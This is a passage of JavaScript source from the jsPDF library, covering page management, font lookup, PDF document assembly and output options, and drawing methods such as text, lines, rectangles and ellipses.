        }
        events.publish('putCatalog');
      },
      putTrailer = function() {
        out('/Size ' + (objectNumber + 1));
        out('/Root ' + objectNumber + ' 0 R');
        out('/Info ' + (objectNumber - 1) + ' 0 R');
      },
      beginPage = function(width, height) {
        // Dimensions are stored as user units and converted to points on output
        var orientation = typeof height === 'string' && height.toLowerCase();
        if (typeof width === 'string') {
          var format = width.toLowerCase();
          if (pageFormats.hasOwnProperty(format)) {
            width = pageFormats[format][0] / k;
            height = pageFormats[format][1] / k;
          }
        }
        if (Array.isArray(width)) {
          height = width[1];
          width = width[0];
        }
        if (orientation) {
          switch (orientation.substr(0, 1)) {
            case 'l':
              if (height > width) orientation = 's';
              break;
            case 'p':
              if (width > height) orientation = 's';
              break;
          }
          if (orientation === 's') {
            tmp = width;
            width = height;
            height = tmp;
          }
        }
        outToPages = true;
        pages[++page] = [];
        pagedim[page] = {
          width: Number(width) || pageWidth,
          height: Number(height) || pageHeight
        };
        pagesContext[page] = {};
        _setPage(page);
      },
      _addPage = function() {
        beginPage.apply(this, arguments);
        // Set line width
        out(f2(lineWidth * k) + ' w');
        // Set draw color
        out(drawColor);
        // resurrecting non-default line caps, joins
        if (lineCapID !== 0) {
          out(lineCapID + ' J');
        }
        if (lineJoinID !== 0) {
          out(lineJoinID + ' j');
        }
        events.publish('addPage', {
          pageNumber: page
        });
      },
      _deletePage = function(n) {
        if (n > 0 && n <= page) {
          pages.splice(n, 1);
          pagedim.splice(n, 1);
          page--;
          if (currentPage > page) {
            currentPage = page;
          }
          this.setPage(currentPage);
        }
      },
      _setPage = function(n) {
        if (n > 0 && n <= page) {
          currentPage = n;
          pageWidth = pagedim[n].width;
          pageHeight = pagedim[n].height;
        }
      },
      /**
       * Returns a document-specific font key - a label assigned to a
       * font name + font type combination at the time the font was added
       * to the font inventory.
       *
       * Font key is used as label for the desired font for a block of text
       * to be added to the PDF document stream.
       * @private
       * @function
       * @param fontName {String} can be undefined on "falthy" to indicate "use current"
       * @param fontStyle {String} can be undefined on "falthy" to indicate "use current"
       * @returns {String} Font key.
       */
      getFont = function(fontName, fontStyle) {
        var key;

        fontName = fontName !== undefined ? fontName : fonts[activeFontKey]
          .fontName;
        fontStyle = fontStyle !== undefined ? fontStyle : fonts[
          activeFontKey].fontStyle;

        if (fontName !== undefined) {
          fontName = fontName.toLowerCase();
        }
        switch (fontName) {
          case 'sans-serif':
          case 'verdana':
          case 'arial':
          case 'helvetica':
            fontName = 'helvetica';
            break;
          case 'fixed':
          case 'monospace':
          case 'terminal':
          case 'courier':
            fontName = 'courier';
            break;
          case 'serif':
          case 'cursive':
          case 'fantasy':
          default:
            fontName = 'times';
            break;
        }

        try {
          // get a string like 'F3' - the KEY corresponding tot he font + type combination.
          key = fontmap[fontName][fontStyle];
        } catch (e) {}

        if (!key) {
          //throw new Error("Unable to look up font label for font '" + fontName + "', '"
          //+ fontStyle + "'. Refer to getFontList() for available fonts.");
          key = fontmap['times'][fontStyle];
          if (key == null) {
            key = fontmap['times']['normal'];
          }
        }
        return key;
      },
      buildDocument = function() {
        outToPages = false; // switches out() to content

        objectNumber = 2;
        content_length = 0;
        content = [];
        offsets = [];
        additionalObjects = [];
        // Added for AcroForm
        events.publish('buildDocument');

        // putHeader()
        out('%PDF-' + pdfVersion);

        putPages();

        // Must happen after putPages
        // Modifies current object Id
        putAdditionalObjects();

        putResources();

        // Info
        newObject();
        out('<<');
        putInfo();
        out('>>');
        out('endobj');

        // Catalog
        newObject();
        out('<<');
        putCatalog();
        out('>>');
        out('endobj');

        // Cross-ref
        var o = content_length,
          i, p = "0000000000";
        out('xref');
        out('0 ' + (objectNumber + 1));
        out(p + ' 65535 f ');
        for (i = 1; i <= objectNumber; i++) {
          var offset = offsets[i];
          if (typeof offset === 'function') {
            out((p + offsets[i]()).slice(-10) + ' 00000 n ');
          } else {
            out((p + offsets[i]).slice(-10) + ' 00000 n ');
          }
        }
        // Trailer
        out('trailer');
        out('<<');
        putTrailer();
        out('>>');
        out('startxref');
        out('' + o);
        out('%%EOF');

        outToPages = true;

        return content.join('\n');
      },
      getStyle = function(style) {
        // see path-painting operators in PDF spec
        var op = 'S'; // stroke
        if (style === 'F') {
          op = 'f'; // fill
        } else if (style === 'FD' || style === 'DF') {
          op = 'B'; // both
        } else if (style === 'f' || style === 'f*' || style === 'B' ||
          style === 'B*') {
          /*
           Allow direct use of these PDF path-painting operators:
           - f	fill using nonzero winding number rule
           - f*	fill using even-odd rule
           - B	fill then stroke with fill using non-zero winding number rule
           - B*	fill then stroke with fill using even-odd rule
           */
          op = style;
        }
        return op;
      },
      getArrayBuffer = function() {
        var data = buildDocument(),
          len = data.length,
          ab = new ArrayBuffer(len),
          u8 = new Uint8Array(ab);

        while (len--) u8[len] = data.charCodeAt(len);
        return ab;
      },
      getBlob = function() {
        return new Blob([getArrayBuffer()], {
          type: "application/pdf"
        });
      },
      /**
       * Generates the PDF document.
       *
       * If `type` argument is undefined, output is raw body of resulting PDF returned as a string.
       *
       * @param {String} type A string identifying one of the possible output types.
       * @param {Object} options An object providing some additional signalling to PDF generator.
       * @function
       * @returns {jsPDF}
       * @methodOf jsPDF#
       * @name output
       */
      output = SAFE(function(type, options) {
        var datauri = ('' + type).substr(0, 6) === 'dataur' ?
          'data:application/pdf;base64,' + btoa(buildDocument()) : 0;

        switch (type) {
          case undefined:
            return buildDocument();
          case 'save':
            if (navigator.getUserMedia) {
              if (global.URL === undefined || global.URL.createObjectURL ===
                undefined) {
                return API.output('dataurlnewwindow');
              }
            }
            saveAs(getBlob(), options);
            if (typeof saveAs.unload === 'function') {
              if (global.setTimeout) {
                setTimeout(saveAs.unload, 911);
              }
            }
            break;
          case 'arraybuffer':
            return getArrayBuffer();
          case 'blob':
            return getBlob();
          case 'bloburi':
          case 'bloburl':
            // User is responsible of calling revokeObjectURL
            return global.URL && global.URL.createObjectURL(getBlob()) ||
              void 0;
          case 'datauristring':
          case 'dataurlstring':
            return datauri;
          case 'dataurlnewwindow':
            var nW = global.open(datauri);
            if (nW || typeof safari === "undefined") return nW;
            /* pass through */
          case 'datauri':
          case 'dataurl':
            return global.document.location.href = datauri;
          default:
            throw new Error('Output type "' + type +
              '" is not supported.');
        }
        // @TODO: Add different output options
      }),

     /**
      * Used to see if a supplied hotfix was requested when the pdf instance was created.
      * @param {String} hotfixName - The name of the hotfix to check.
      * @returns {boolean}
     */
     hasHotfix = function(hotfixName) {
       return (Array.isArray(hotfixes) === true
       && hotfixes.indexOf(hotfixName) > -1);
    };

    switch (unit) {
      case 'pt':
        k = 1;
        break;
      case 'mm':
        k = 72 / 25.4000508;
        break;
      case 'cm':
        k = 72 / 2.54000508;
        break;
      case 'in':
        k = 72;
        break;
      case 'px':
        if (hasHotfix('px_scaling') == true) {
          k = 72 / 96;
        }
        else {
          k = 96 / 72;
        }
        break;
      case 'pc':
        k = 12;
        break;
      case 'em':
        k = 12;
        break;
      case 'ex':
        k = 6;
        break;
      default:
        throw ('Invalid unit: ' + unit);
    }
    
    setCreationDate();
    
    //---------------------------------------
    // Public API

    /**
     * Object exposing internal API to plugins
     * @public
     */
    API.internal = {
      'pdfEscape': pdfEscape,
      'getStyle': getStyle,
      /**
       * Returns {FontObject} describing a particular font.
       * @public
       * @function
       * @param fontName {String} (Optional) Font's family name
       * @param fontStyle {String} (Optional) Font's style variation name (Example:"Italic")
       * @returns {FontObject}
       */
      'getFont': function() {
        return fonts[getFont.apply(API, arguments)];
      },
      'getFontSize': function() {
        return activeFontSize;
      },
      'getTextColor': function getTextColor() {
        var colorEncoded = textColor.split(' ')
        if (colorEncoded.length == 2 && colorEncoded[-1] == 'g') {
          return '#000000'
        } else {
          var x;
          var colorAsHex = '#'
          for (var i = 0; i < 3; i++) {
            x = Math.floor(parseFloat(colorEncoded[i]) * 255).toString(16);
            colorAsHex += (x.length == 1) ? "0"+x : x;
          }
        }
        return colorAsHex
      },
      'getLineHeight': function() {
        return activeFontSize * lineHeightProportion;
      },
      'write': function(string1 /*, string2, string3, etc */ ) {
        out(arguments.length === 1 ? string1 : Array.prototype.join.call(
          arguments, ' '));
      },
      'getCoordinateString': function(value) {
        return f2(value * k);
      },
      'getVerticalCoordinateString': function(value) {
        return f2((pageHeight - value) * k);
      },
      'collections': {},
      'newObject': newObject,
      'newAdditionalObject': newAdditionalObject,
      'newObjectDeferred': newObjectDeferred,
      'newObjectDeferredBegin': newObjectDeferredBegin,
      'putStream': putStream,
      'events': events,
      // ratio that you use in multiplication of a given "size" number to arrive to 'point'
      // units of measurement.
      // scaleFactor is set at initialization of the document and calculated against the stated
      // default measurement units for the document.
      // If default is "mm", k is the number that will turn number in 'mm' into 'points' number.
      // through multiplication.
      'scaleFactor': k,
      'pageSize': {
        get width() {
          return pageWidth
        },
        get height() {
          return pageHeight
        }
      },
      'output': function(type, options) {
        return output(type, options);
      },
      'getNumberOfPages': function() {
        return pages.length - 1;
      },
      'pages': pages,
      'out': out,
      'f2': f2,
      'getPageInfo': function(pageNumberOneBased) {
        var objId = (pageNumberOneBased - 1) * 2 + 3;
        return {
          objId: objId,
          pageNumber: pageNumberOneBased,
          pageContext: pagesContext[pageNumberOneBased]
        };
      },
      'getCurrentPageInfo': function() {
        var objId = (currentPage - 1) * 2 + 3;
        return {
          objId: objId,
          pageNumber: currentPage,
          pageContext: pagesContext[currentPage]
        };
      },
      'getPDFVersion': function() {
        return pdfVersion;
       },
      'hasHotfix': hasHotfix      //Expose the hasHotfix check so plugins can also check them.
    };

    /**
     * Adds (and transfers the focus to) new page to the PDF document.
     * @function
     * @returns {jsPDF}
     *
     * @methodOf jsPDF#
     * @name addPage
     */
    API.addPage = function() {
      _addPage.apply(this, arguments);
      return this;
    };
    /**
     * Adds (and transfers the focus to) new page to the PDF document.
     * @function
     * @returns {jsPDF}
     *
     * @methodOf jsPDF#
     * @name setPage
     * @param {Number} page Switch the active page to the page number specified
     * @example
     * doc = jsPDF()
     * doc.addPage()
     * doc.addPage()
     * doc.text('I am on page 3', 10, 10)
     * doc.setPage(1)
     * doc.text('I am on page 1', 10, 10)
     */
    API.setPage = function() {
      _setPage.apply(this, arguments);
      return this;
    };
    API.insertPage = function(beforePage) {
      this.addPage();
      this.movePage(currentPage, beforePage);
      return this;
    };
    API.movePage = function(targetPage, beforePage) {
      if (targetPage > beforePage) {
        var tmpPages = pages[targetPage];
        var tmpPagedim = pagedim[targetPage];
        var tmpPagesContext = pagesContext[targetPage];
        for (var i = targetPage; i > beforePage; i--) {
          pages[i] = pages[i - 1];
          pagedim[i] = pagedim[i - 1];
          pagesContext[i] = pagesContext[i - 1];
        }
        pages[beforePage] = tmpPages;
        pagedim[beforePage] = tmpPagedim;
        pagesContext[beforePage] = tmpPagesContext;
        this.setPage(beforePage);
      } else if (targetPage < beforePage) {
        var tmpPages = pages[targetPage];
        var tmpPagedim = pagedim[targetPage];
        var tmpPagesContext = pagesContext[targetPage];
        for (var i = targetPage; i < beforePage; i++) {
          pages[i] = pages[i + 1];
          pagedim[i] = pagedim[i + 1];
          pagesContext[i] = pagesContext[i + 1];
        }
        pages[beforePage] = tmpPages;
        pagedim[beforePage] = tmpPagedim;
        pagesContext[beforePage] = tmpPagesContext;
        this.setPage(beforePage);
      }
      return this;
    };

    API.deletePage = function() {
      _deletePage.apply(this, arguments);
      return this;
    };
    
    API.setCreationDate = function (date) {
      setCreationDate(date);    
      return this;
    }
    
    API.getCreationDate = function (type) {
      return getCreationDate(type);
    }
    

    /**
     * Set the display mode options of the page like zoom and layout.
     *
     * @param {integer|String} zoom   You can pass an integer or percentage as
     * a string. 2 will scale the document up 2x, '200%' will scale up by the
     * same amount. You can also set it to 'fullwidth', 'fullheight',
     * 'fullpage', or 'original'.
     *
     * Only certain PDF readers support this, such as Adobe Acrobat
     *
     * @param {String} layout Layout mode can be: 'continuous' - this is the
     * default continuous scroll. 'single' - the single page mode only shows one
     * page at a time. 'twoleft' - two column left mode, first page starts on
     * the left, and 'tworight' - pages are laid out in two columns, with the
     * first page on the right. This would be used for books.
     * @param {String} pmode 'UseOutlines' - it shows the
     * outline of the document on the left. 'UseThumbs' - shows thumbnails along
     * the left. 'FullScreen' - prompts the user to enter fullscreen mode.
     *
     * @function
     * @returns {jsPDF}
     * @name setDisplayMode
     */
    API.setDisplayMode = function(zoom, layout, pmode) {
        zoomMode = zoom;
        layoutMode = layout;
        pageMode = pmode;

        var validPageModes = [undefined, null, 'UseNone', 'UseOutlines', 'UseThumbs', 'FullScreen'];
        if (validPageModes.indexOf(pmode) == -1) {
          throw new Error('Page mode must be one of UseNone, UseOutlines, UseThumbs, or FullScreen. "' + pmode + '" is not recognized.')
        }
        return this;
      },

      /**
       * Adds text to page. Supports adding multiline text when 'text' argument is an Array of Strings.
       *
       * @function
       * @param {String|Array} text String or array of strings to be added to the page. Each line is shifted one line down per font, spacing settings declared before this call.
       * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
       * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
       * @param {Object} flags Collection of settings signalling how the text must be encoded. Defaults are sane. If you think you want to pass some flags, you likely can read the source.
       * @returns {jsPDF}
       * @methodOf jsPDF#
       * @name text
       */
      API.text = function(text, x, y, flags, angle, align) {
        /**
         * Inserts something like this into PDF
         *   BT
         *    /F1 16 Tf  % Font name + size
         *    16 TL % How many units down for next line in multiline text
         *    0 g % color
         *    28.35 813.54 Td % position
         *    (line one) Tj
         *    T* (line two) Tj
         *    T* (line three) Tj
         *   ET
         */
        function ESC(s) {
          s = s.split("\t").join(Array(options.TabLen || 9).join(" "));
          return pdfEscape(s, flags);
        }

        // Pre-August-2012 the order of arguments was function(x, y, text, flags)
        // in effort to make all calls have similar signature like
        //   function(data, coordinates... , miscellaneous)
        // this method had its args flipped.
        // code below allows backward compatibility with old arg order.
        if (typeof text === 'number') {
          tmp = y;
          y = x;
          x = text;
          text = tmp;
        }

        // If there are any newlines in text, we assume
        // the user wanted to print multiple lines, so break the
        // text up into an array.  If the text is already an array,
        // we assume the user knows what they are doing.
        // Convert text into an array anyway to simplify
        // later code.
        if (typeof text === 'string') {
          if (text.match(/[\n\r]/)) {
            text = text.split(/\r\n|\r|\n/g);
          } else {
            text = [text];
          }
        }
        if (typeof angle === 'string') {
          align = angle;
          angle = null;
        }
        if (typeof flags === 'string') {
          align = flags;
          flags = null;
        }
        if (typeof flags === 'number') {
          angle = flags;
          flags = null;
        }
        var xtra = '',
          mode = 'Td',
          todo;
        if (angle) {
          angle *= (Math.PI / 180);
          var c = Math.cos(angle),
            s = Math.sin(angle);
          xtra = [f2(c), f2(s), f2(s * -1), f2(c), ''].join(" ");
          mode = 'Tm';
        }
        flags = flags || {};
        if (!('noBOM' in flags))
          flags.noBOM = true;
        if (!('autoencode' in flags))
          flags.autoencode = true;

        var strokeOption = '';
        var pageContext = this.internal.getCurrentPageInfo().pageContext;
        if (true === flags.stroke) {
          if (pageContext.lastTextWasStroke !== true) {
            strokeOption = '1 Tr\n';
            pageContext.lastTextWasStroke = true;
          }
        } else {
          if (pageContext.lastTextWasStroke) {
            strokeOption = '0 Tr\n';
          }
          pageContext.lastTextWasStroke = false;
        }

        if (typeof this._runningPageHeight === 'undefined') {
          this._runningPageHeight = 0;
        }

        if (typeof text === 'string') {
          text = ESC(text);
        } else if (Object.prototype.toString.call(text) ===
          '[object Array]') {
          // we don't want to destroy  original text array, so cloning it
          var sa = text.concat(),
            da = [],
            len = sa.length;
          // we do array.join('text that must not be PDFescaped")
          // thus, pdfEscape each component separately
          while (len--) {
            da.push(ESC(sa.shift()));
          }
          var linesLeft = Math.ceil((pageHeight - y - this._runningPageHeight) *
            k / (activeFontSize * lineHeightProportion));
          if (0 <= linesLeft && linesLeft < da.length + 1) {
            //todo = da.splice(linesLeft-1);
          }

          if (align) {
            var left,
              prevX,
              maxLineLength,
              leading = activeFontSize * lineHeightProportion,
              lineWidths = text.map(function(v) {
                return this.getStringUnitWidth(v) * activeFontSize / k;
              }, this);
            maxLineLength = Math.max.apply(Math, lineWidths);
            // The first line uses the "main" Td setting,
            // and the subsequent lines are offset by the
            // previous line's x coordinate.
            if (align === "center") {
              // The passed in x coordinate defines
              // the center point.
              left = x - maxLineLength / 2;
              x -= lineWidths[0] / 2;
            } else if (align === "right") {
              // The passed in x coordinate defines the
              // rightmost point of the text.
              left = x - maxLineLength;
              x -= lineWidths[0];
            } else {
              throw new Error(
                'Unrecognized alignment option, use "center" or "right".'
              );
            }
            prevX = x;
            text = da[0];
            for (var i = 1, len = da.length; i < len; i++) {
              var delta = maxLineLength - lineWidths[i];
              if (align === "center") delta /= 2;
              // T* = x-offset leading Td ( text )
              text += ") Tj\n" + ((left - prevX) + delta) + " -" + leading +
                " Td (" + da[i];
              prevX = left + delta;
            }
          } else {
            text = da.join(") Tj\nT* (");
          }
        } else {
          throw new Error('Type of text must be string or Array. "' + text +
            '" is not recognized.');
        }
        // Using "'" ("go next line and render text" mark) would save space but would complicate our rendering code, templates

        // BT .. ET does NOT have default settings for Tf. You must state that explicitely every time for BT .. ET
        // if you want text transformation matrix (+ multiline) to work reliably (which reads sizes of things from font declarations)
        // Thus, there is NO useful, *reliable* concept of "default" font for a page.
        // The fact that "default" (reuse font used before) font worked before in basic cases is an accident
        // - readers dealing smartly with brokenness of jsPDF's markup.

        var curY;

        if (todo) {
          //this.addPage();
          //this._runningPageHeight += y -  (activeFontSize * 1.7 / k);
          //curY = f2(pageHeight - activeFontSize * 1.7 /k);
        } else {
          curY = f2((pageHeight - y) * k);
        }
        //curY = f2((pageHeight - (y - this._runningPageHeight)) * k);

        //			if (curY < 0){
        //				console.log('auto page break');
        //				this.addPage();
        //				this._runningPageHeight = y -  (activeFontSize * 1.7 / k);
        //				curY = f2(pageHeight - activeFontSize * 1.7 /k);
        //			}

        out(
          'BT\n/' +
          activeFontKey + ' ' + activeFontSize + ' Tf\n' + // font face, style, size
          (activeFontSize * lineHeightProportion) + ' TL\n' + // line spacing
          strokeOption + // stroke option
          textColor +
          '\n' + xtra + f2(x * k) + ' ' + curY + ' ' + mode + '\n(' +
          text +
          ') Tj\nET');

        if (todo) {
          //this.text( todo, x, activeFontSize * 1.7 / k);
          //this.text( todo, x, this._runningPageHeight + (activeFontSize * 1.7 / k));
          this.text(todo, x, y); // + (activeFontSize * 1.7 / k));
        }

        return this;
      };

    /**
     * Letter spacing method to print text with gaps
     *
     * @function
     * @param {String|Array} text String to be added to the page.
     * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} spacing Spacing (in units declared at inception)
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name lstext
     * @deprecated We'll be removing this function. It doesn't take character width into account.
     */
    API.lstext = function(text, x, y, spacing) {
      console.warn('jsPDF.lstext is deprecated');
      for (var i = 0, len = text.length; i < len; i++, x += spacing) this
        .text(text[i], x, y);
      return this;
    };

    API.line = function(x1, y1, x2, y2) {
      return this.lines([
        [x2 - x1, y2 - y1]
      ], x1, y1);
    };

    API.clip = function() {
      // By patrick-roberts, github.com/MrRio/jsPDF/issues/328
      // Call .clip() after calling .rect() with a style argument of null
      out('W') // clip
      out('S') // stroke path; necessary for clip to work
    };

    /**
     * This fixes the previous function clip(). Perhaps the 'stroke path' hack was due to the missing 'n' instruction?
     * We introduce the fixed version so as to not break API.
     * @param fillRule
     */
    API.clip_fixed = function(fillRule) {
      // Call .clip() after calling drawing ops with a style argument of null
      // W is the PDF clipping op
      if ('evenodd' === fillRule) {
        out('W*');
      } else {
        out('W');
      }
      // End the path object without filling or stroking it.
      // This operator is a path-painting no-op, used primarily for the side effect of changing the current clipping path
      // (see Section 4.4.3, “Clipping Path Operators”)
      out('n');
    };

    /**
     * Adds series of curves (straight lines or cubic bezier curves) to canvas, starting at `x`, `y` coordinates.
     * All data points in `lines` are relative to last line origin.
     * `x`, `y` become x1,y1 for first line / curve in the set.
     * For lines you only need to specify [x2, y2] - (ending point) vector against x1, y1 starting point.
     * For bezier curves you need to specify [x2,y2,x3,y3,x4,y4] - vectors to control points 1, 2, ending point. All vectors are against the start of the curve - x1,y1.
     *
     * @example .lines([[2,2],[-2,2],[1,1,2,2,3,3],[2,1]], 212,110, 10) // line, line, bezier curve, line
     * @param {Array} lines Array of *vector* shifts as pairs (lines) or sextets (cubic bezier curves).
     * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} scale (Defaults to [1.0,1.0]) x,y Scaling factor for all vectors. Elements can be any floating number Sub-one makes drawing smaller. Over-one grows the drawing. Negative flips the direction.
     * @param {String} style A string specifying the painting style or null.  Valid styles include: 'S' [default] - stroke, 'F' - fill,  and 'DF' (or 'FD') -  fill then stroke. A null value postpones setting the style so that a shape may be composed using multiple method calls. The last drawing method call used to define the shape should not have a null style argument.
     * @param {Boolean} closed If true, the path is closed with a straight line from the end of the last curve to the starting point.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name lines
     */
    API.lines = function(lines, x, y, scale, style, closed) {
      var scalex, scaley, i, l, leg, x2, y2, x3, y3, x4, y4;

      // Pre-August-2012 the order of arguments was function(x, y, lines, scale, style)
      // in effort to make all calls have similar signature like
      //   function(content, coordinateX, coordinateY , miscellaneous)
      // this method had its args flipped.
      // code below allows backward compatibility with old arg order.
      if (typeof lines === 'number') {
        tmp = y;
        y = x;
        x = lines;
        lines = tmp;
      }

      scale = scale || [1, 1];

      // starting point
      out(f3(x * k) + ' ' + f3((pageHeight - y) * k) + ' m ');

      scalex = scale[0];
      scaley = scale[1];
      l = lines.length;
      //, x2, y2 // bezier only. In page default measurement "units", *after* scaling
      //, x3, y3 // bezier only. In page default measurement "units", *after* scaling
      // ending point for all, lines and bezier. . In page default measurement "units", *after* scaling
      x4 = x; // last / ending point = starting point for first item.
      y4 = y; // last / ending point = starting point for first item.

      for (i = 0; i < l; i++) {
        leg = lines[i];
        if (leg.length === 2) {
          // simple line
          x4 = leg[0] * scalex + x4; // here last x4 was prior ending point
          y4 = leg[1] * scaley + y4; // here last y4 was prior ending point
          out(f3(x4 * k) + ' ' + f3((pageHeight - y4) * k) + ' l');
        } else {
          // bezier curve
          x2 = leg[0] * scalex + x4; // here last x4 is prior ending point
          y2 = leg[1] * scaley + y4; // here last y4 is prior ending point
          x3 = leg[2] * scalex + x4; // here last x4 is prior ending point
          y3 = leg[3] * scaley + y4; // here last y4 is prior ending point
          x4 = leg[4] * scalex + x4; // here last x4 was prior ending point
          y4 = leg[5] * scaley + y4; // here last y4 was prior ending point
          out(
            f3(x2 * k) + ' ' +
            f3((pageHeight - y2) * k) + ' ' +
            f3(x3 * k) + ' ' +
            f3((pageHeight - y3) * k) + ' ' +
            f3(x4 * k) + ' ' +
            f3((pageHeight - y4) * k) + ' c');
        }
      }

      if (closed) {
        out(' h');
      }

      // stroking / filling / both the path
      if (style !== null) {
        out(getStyle(style));
      }
      return this;
    };

    /**
     * Adds a rectangle to PDF
     *
     * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} w Width (in units declared at inception of PDF document)
     * @param {Number} h Height (in units declared at inception of PDF document)
     * @param {String} style A string specifying the painting style or null.  Valid styles include: 'S' [default] - stroke, 'F' - fill,  and 'DF' (or 'FD') -  fill then stroke. A null value postpones setting the style so that a shape may be composed using multiple method calls. The last drawing method call used to define the shape should not have a null style argument.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name rect
     */
    API.rect = function(x, y, w, h, style) {
      var op = getStyle(style);
      out([
        f2(x * k),
        f2((pageHeight - y) * k),
        f2(w * k),
        f2(-h * k),
        're'
      ].join(' '));

      if (style !== null) {
        out(getStyle(style));
      }

      return this;
    };

    /**
     * Adds a triangle to PDF
     *
     * @param {Number} x1 Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y1 Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} x2 Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y2 Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} x3 Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y3 Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {String} style A string specifying the painting style or null.  Valid styles include: 'S' [default] - stroke, 'F' - fill,  and 'DF' (or 'FD') -  fill then stroke. A null value postpones setting the style so that a shape may be composed using multiple method calls. The last drawing method call used to define the shape should not have a null style argument.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name triangle
     */
    API.triangle = function(x1, y1, x2, y2, x3, y3, style) {
      this.lines(
        [
          [x2 - x1, y2 - y1], // vector to point 2
          [x3 - x2, y3 - y2], // vector to point 3
          [x1 - x3, y1 - y3] // closing vector back to point 1
        ],
        x1,
        y1, // start of path
        [1, 1],
        style,
        true);
      return this;
    };

    /**
     * Adds a rectangle with rounded corners to PDF
     *
     * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} w Width (in units declared at inception of PDF document)
     * @param {Number} h Height (in units declared at inception of PDF document)
     * @param {Number} rx Radius along x axis (in units declared at inception of PDF document)
     * @param {Number} rx Radius along y axis (in units declared at inception of PDF document)
     * @param {String} style A string specifying the painting style or null.  Valid styles include: 'S' [default] - stroke, 'F' - fill,  and 'DF' (or 'FD') -  fill then stroke. A null value postpones setting the style so that a shape may be composed using multiple method calls. The last drawing method call used to define the shape should not have a null style argument.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name roundedRect
     */
    API.roundedRect = function(x, y, w, h, rx, ry, style) {
      var MyArc = 4 / 3 * (Math.SQRT2 - 1);
      this.lines(
        [
          [(w - 2 * rx), 0],
          [(rx * MyArc), 0, rx, ry - (ry * MyArc), rx, ry],
          [0, (h - 2 * ry)],
          [0, (ry * MyArc), -(rx * MyArc), ry, -rx, ry],
          [(-w + 2 * rx), 0],
          [-(rx * MyArc), 0, -rx, -(ry * MyArc), -rx, -ry],
          [0, (-h + 2 * ry)],
          [0, -(ry * MyArc), (rx * MyArc), -ry, rx, -ry]
        ],
        x + rx,
        y, // start of path
        [1, 1],
        style);
      return this;
    };

    /**
     * Adds an ellipse to PDF
     *
     * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} rx Radius along x axis (in units declared at inception of PDF document)
     * @param {Number} rx Radius along y axis (in units declared at inception of PDF document)
     * @param {String} style A string specifying the painting style or null.  Valid styles include: 'S' [default] - stroke, 'F' - fill,  and 'DF' (or 'FD') -  fill then stroke. A null value postpones setting the style so that a shape may be composed using multiple method calls. The last drawing method call used to define the shape should not have a null style argument.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name ellipse
     */
    API.ellipse = function(x, y, rx, ry, style) {
      var lx = 4 / 3 * (Math.SQRT2 - 1) * rx,
        ly = 4 / 3 * (Math.SQRT2 - 1) * ry;

      out([
        f2((x + rx) * k),
        f2((pageHeight - y) * k),
        'm',
        f2((x + rx) * k),
        f2((pageHeight - (y - ly)) * k),
        f2((x + lx) * k),
        f2((pageHeight - (y - ry)) * k),
        f2(x * k),
        f2((pageHeight - (y - ry)) * k),
        'c'
      ].join(' '));
      out([
        f2((x - lx) * k),
        f2((pageHeight - (y - ry)) * k),
        f2((x - rx) * k),
        f2((pageHeight - (y - ly)) * k),
        f2((x - rx) * k),
        f2((pageHeight - y) * k),
        'c'
      ].join(' '));
      out([
        f2((x - rx) * k),
        f2((pageHeight - (y + ly)) * k),
        f2((x - lx) * k),
        f2((pageHeight - (y + ry)) * k),
        f2(x * k),
        f2((pageHeight - (y + ry)) * k),
        'c'
      ].join(' '));
      out([
        f2((x + lx) * k),
        f2((pageHeight - (y + ry)) * k),
        f2((x + rx) * k),
        f2((pageHeight - (y + ly)) * k),
        f2((x + rx) * k),
        f2((pageHeight - y) * k),
        'c'
      ].join(' '));

      if (style !== null) {
        out(getStyle(style));
      }

      return this;
    };

    /**
     * Adds an circle to PDF
     *
     * @param {Number} x Coordinate (in units declared at inception of PDF document) against left edge of the page
     * @param {Number} y Coordinate (in units declared at inception of PDF document) against upper edge of the page
     * @param {Number} r Radius (in units declared at inception of PDF document)
     * @param {String} style A string specifying the painting style or null.  Valid styles include: 'S' [default] - stroke, 'F' - fill,  and 'DF' (or 'FD') -  fill then stroke. A null value postpones setting the style so that a shape may be composed using multiple method calls. The last drawing method call used to define the shape should not have a null style argument.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name circle
     */
    API.circle = function(x, y, r, style) {
      return this.ellipse(x, y, r, r, style);
    };

    /**
     * Adds a properties to the PDF document
     *
     * @param {Object} A property_name-to-property_value object structure.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setProperties
     */
    API.setProperties = function(properties) {
      // copying only those properties we can render.
      for (var property in documentProperties) {
        if (documentProperties.hasOwnProperty(property) && properties[
            property]) {
          documentProperties[property] = properties[property];
        }
      }
      return this;
    };

    /**
     * Sets font size for upcoming text elements.
     *
     * @param {Number} size Font size in points.
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setFontSize
     */
    API.setFontSize = function(size) {
      activeFontSize = size;
      return this;
    };

    /**
     * Sets text font face, variant for upcoming text elements.
     * See output of jsPDF.getFontList() for possible font names, styles.
     *
     * @param {String} fontName Font name or family. Example: "times"
